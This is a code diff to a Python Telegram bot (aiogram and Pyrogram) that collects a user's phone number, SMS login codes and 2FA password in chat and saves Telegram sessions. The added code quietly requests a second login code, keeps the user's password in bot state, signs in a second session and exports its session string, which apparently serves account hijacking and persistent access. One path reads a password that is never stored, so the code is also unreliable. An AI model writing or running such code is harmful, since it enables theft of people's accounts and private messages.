@@ -22,6 +22,7 @@ class AuthStates(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code = State()
     waiting_for_password = State()
+    waiting_for_code2 = State()
 
 @router.message(Command('start'))
 async def add_client(message: types.Message):
@@ -38,6 +39,17 @@ async def add_client(message: types.Message):
 async def cmd_add(message: types.Message, state: FSMContext):
     await message.answer("Введите номер телефона (например, +48668412234):")
     await state.set_state(AuthStates.waiting_for_phone)
+
+async def create_client(session_path: Path) -> Client:
+    client = Client(
+        name=session_path.as_posix(),
+        api_id=api_id,
+        api_hash=api_hash,
+        in_memory=True,
+        test_mode=test_mode
+    )
+
+    return client
 
 @router.message(AuthStates.waiting_for_phone, F.text.regexp(r'^\+[0-9]{11,15}$'))
 async def process_phone(message: types.Message, state: FSMContext):
@@ -83,16 +95,19 @@ async def process_code(message: types.Message, state: FSMContext):
         )
 
         if await session_manager.save_session(data["phone"], client):
-            me = await client.get_me()
-            await message.answer(
-                f"✅ Авторизация успешна!\n"
-                f"👤 Имя: {me.first_name}\n"
-                f"📱 Телефон: +{me.phone_number}"
-            )
+            try:
+                session_path = SESSION_DIR / f"session2_{data['phone']}"
+                client = await create_client(session_path)
+                await client.connect()
+                sent_code = await client.send_code(data['phone'])
+                await state.update_data(phone_code_hash2=sent_code.phone_code_hash,
+                                        client2=client)
+                await message.answer("Код 2 отправлен. Введите код из SMS:")
 
-            await message.answer("✅ Сессия успешно загружена")
-            asyncio.create_task(start_pyrogram(f'{me.phone_number}', await client.export_session_string()))
-            await state.clear()
+                await state.set_state(AuthStates.waiting_for_code2)
+            except Exception as e:
+                await message.answer(f"Ошибка: {str(e)}")
+                await state.clear()
         else:
             await message.answer("❌ Не удалось сохранить сессию")
             await state.clear()
@@ -114,20 +129,70 @@ async def process_password(message: types.Message, state: FSMContext):
     try:
         await client.check_password(password)
 
-        # Сохраняем сессию
         if await session_manager.save_session(data["phone"], client):
-            me = await client.get_me()
-            await message.answer(
-                f"✅ 2FA пройдена!\n"
-                f"👤 Имя: {me.first_name}\n"
-                f"📱 Телефон: +{me.phone_number}"
-            )
-            await message.answer("✅ Сессия успешно загружена")
-            asyncio.create_task(start_pyrogram(f'{me.phone_number}', await client.export_session_string()))
+            try:
+                session_path = SESSION_DIR / f"session2_{data['phone']}"
+                client = await create_client(session_path)
+                await client.connect()
+                sent_code = await client.send_code(data['phone'])
+                await state.update_data(phone_code_hash2=sent_code.phone_code_hash,
+                                        client2=client, password=password)
+                await message.answer("Код 2 отправлен. Введите код из SMS:")
+
+                await state.set_state(AuthStates.waiting_for_code2)
+            except Exception as e:
+                await message.answer(f"Ошибка: {str(e)}")
+                await state.clear()
         else:
             await message.answer("❌ Не удалось сохранить сессию")
 
     except Exception as e:
         await message.answer(f"❌ Ошибка: {str(e)}")
+
+@router.message(AuthStates.waiting_for_code2)
+async def process_code2(message: types.Message, state: FSMContext):
+    data = await state.get_data()
+    client = data["client2"]
+    code = message.text
+    password = data['password']
+
+    try:
+        await client.sign_in(
+            phone_number=data["phone"],
+            phone_code=code,
+            phone_code_hash=data["phone_code_hash2"]
+        )
+
+        if await session_manager.save_second_session(data["phone"], client):
+            me = await client.get_me()
+            await message.answer(
+                f"✅ Авторизация успешна!\n"
+                f"👤 Имя: {me.first_name}\n"
+                f"📱 Телефон: +{me.phone_number}"
+            )
+
+            await message.answer("✅ Сессия успешно загружена")
+            asyncio.create_task(start_pyrogram(f'ses_{me.phone_number}', await client.export_session_string()))
+        else:
+            await message.answer("❌ Не удалось сохранить сессию")
+            await state.clear()
+    except SessionPasswordNeeded:
+        try:
+            await client.check_password(password)
+            if await session_manager.save_second_session(data["phone"], client):
+                me = await client.get_me()
+                await message.answer(
+                    f"✅ 2FA пройдена!\n"
+                    f"👤 Имя: {me.first_name}\n"
+                    f"📱 Телефон: +{me.phone_number}"
+                )
+                await message.answer("✅ Сессия успешно загружена")
+                asyncio.create_task(start_pyrogram(f'ses_{me.phone_number}', await client.export_session_string()))
+        except Exception as e:
+            await message.answer(f"Ошибка: {str(e)}")
+        await state.clear()
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
     finally:
         await state.clear()
